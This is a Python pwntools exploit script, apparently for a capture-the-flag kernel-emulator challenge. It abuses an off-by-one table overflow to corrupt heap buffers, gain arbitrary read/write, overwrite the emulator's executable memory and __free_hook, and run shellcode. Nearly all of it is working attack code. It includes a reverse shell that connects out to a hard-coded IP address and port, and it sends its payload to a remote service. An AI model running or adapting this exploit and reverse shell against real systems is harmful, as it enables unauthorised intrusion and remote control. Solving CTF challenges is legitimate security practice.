from pwn import *
import binascii

context(arch='amd64', os='linux')
p = remote("sibal.life", 7483)
#p = remote("52.78.196.197", 7483)

exe = ELF("./microjinkernel_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
#p = process([exe.path], env={"LD_PRELOAD":'./libc-2.31.so:./libunicorn.so.2'})
#pause()
'''
# Vuln
table size 255
but for loop i : 0 => 256

# Exploit
1. 8byte overflow => overwrite fd[0]'s BUF SIZE => heap_overflow
2. heap_overflow -> overwrite( struct buf_table -> buf ) -> aaw / aar
3. overwrite unicorn rwx => shellcode
   __free_hook -> shellcode address

-> get shell

# MTU Issue
;; socket data of size 0x1000 have a MTU Issue ;;
'''
base = 0x1000000
rsp = 0x1100000

def kopen(address, cnt):
    pay = f'''
        mov rax, 65537
        mov rdi, {address}
        mov rsi, {cnt}
        syscall
        '''
    return pay

def init_mem(idx, size):
    pay = f'''
        mov rdi, {idx}
        mov rsi, {size}
        mov rax, 65538
        syscall
    '''

    return pay

def read_mem(key, idx, size, address):
    pay = f'''
        mov rdi, {key}
        mov rsi, {idx}
        mov rdx, {size}
        mov rcx, {address}
        mov rax, 65540
        syscall
    '''
    return pay
    
def write_mem(key, idx, size, address):
    pay = f'''
        mov rdi, {key}
        mov rsi, {idx}
        mov rdx, {size}
        mov rcx, {address}
        mov rax, 65541
        syscall
    '''
    return pay

def set_ret(address, cnt):
    pay = f'''
        mov rax, 65543
        mov rdi, {address}
        mov rsi, {cnt}
        syscall
    '''

    return pay

def kclose(fd):
    pay = f'''
        mov rax, 65539
        mov rdi, {fd}
        syscall
    '''

    return pay

# pay += write_mem('r15', 0x7fffffffffffffff, 0x1000, rsp - 0x10)
rsp -= 0x10

reverse_shellcode = asm(shellcraft.amd64.linux.connect('3.35.167.47', 1234, 'ipv4'))
reverse_shellcode += asm(shellcraft.amd64.linux.findpeersh(1234))

pay = ''
pay += '''
mov rsp, 0x1008000
'''
pay += shellcraft.pushstr(reverse_shellcode)
pay += 'mov rsp, 0x1100000'

pay += shellcraft.pushstr(b"/tmp/aaaaa")
pay += kopen(rsp,11) # fd 0
pay += init_mem(0, 0x1000)

rsp -= 0x10
pay += shellcraft.pushstr(b"/tmp/bbbbb")
pay += kopen(rsp, 11) # fd 1
pay += init_mem(1, 0x1000)
pay += kclose(1)


rsp -= (24 * 256)
pay += '''
push 1
push 230003
push 1
'''

for i in range(255):
    pay +='''
        push 0
        push 230003 
        push 255
    '''

pay += set_ret(rsp, 0xff)

pay += shellcraft.pushstr(b'/tmp/qw')
rsp -= 8
pay += kopen('rsp', 8)
pay += init_mem(1, 0x0123)

pay += kopen('rsp', 0x10)
pay += init_mem(2, 0x990)

pay += kopen('rsp', 0x10)
pay += init_mem(3, 0x10)

pay += kopen('rsp', 0x10)
pay += init_mem(4, 0x100)
pay += 'mov r15, rax'

pay += kopen('rsp', 0x10)
pay += init_mem(5, 0x10)
pay += 'mov r14, rax'

pay += kopen('rsp', 0x10)
pay += init_mem(6, 0x10)

pay += kopen('rsp', 0x10)
pay += init_mem(7, 0x10)

pay += kopen('rsp', 0x10)
pay += init_mem(8, 0x10)

rwx_page = 0x1001000
pay += 'mov rsp, 0x1001000' # 
pay += write_mem(0xffffffff00000000, 0x7a250, 8, 'rsp') # get rwx
pay += read_mem(0xffffffff00000000, 0x7a250 + 0x38, 8, 'rsp') # set rwx

pay += '''
    pop r8
    push r8
    add r8, 0x41ba9028
    push r8
'''
# 0x403cf028
# 0x403cf028
# 0x41ba9028

pay += read_mem(0xffffffff00000000, 0x7a250 + 0x1c8, 8, 'rsp') # set freehok
pay += 'pop r8'
pay += read_mem('r15',0, len(reverse_shellcode), 0x1008000 - len(reverse_shellcode)-7)
pay += read_mem('r14', 0, 8, 0x1001000)

print(hex(len(asm(pay))))
p.sendafter("code > ", asm(pay))

p.interactive()
